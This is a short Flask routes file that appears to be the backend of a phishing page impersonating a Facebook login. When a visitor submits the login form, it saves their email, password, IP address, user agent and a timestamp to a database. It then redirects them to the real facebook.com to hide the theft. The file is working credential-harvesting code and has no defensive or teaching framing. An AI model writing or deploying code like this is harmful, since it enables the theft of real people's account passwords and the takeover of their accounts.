from flask import Blueprint, render_template, request, redirect
from datetime import datetime
from .db import insert_credential

routes = Blueprint('routes', __name__)

@routes.route('/')
def index():
        return redirect('login')

@routes.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        user_agent = request.headers.get('User_Agent')
        timestamp = datetime.utcnow().isoformat()

        insert_credential(email, password, ip, user_agent, timestamp)

        return redirect('https://facebook.com')

    return render_template('login.html')
